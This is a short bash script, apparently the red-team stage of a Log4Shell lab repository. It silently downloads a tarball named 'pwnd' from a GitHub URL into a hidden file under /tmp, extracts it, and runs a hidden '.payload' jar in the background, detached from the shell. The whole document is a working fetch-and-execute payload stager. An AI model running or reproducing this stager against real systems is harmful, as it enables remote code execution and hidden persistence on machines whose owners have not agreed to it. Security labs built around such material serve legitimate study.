#!/bin/bash
#----------
wget -q -O /tmp/.pwnd.tar.gz https://github.com/hotpotcookie/log4shell-white-box/raw/main/red/pwnd.tar.gz & wait
tar -xf /tmp/.pwnd.tar.gz & wait
java -jar /tmp/.payload-6.22.jar & disown
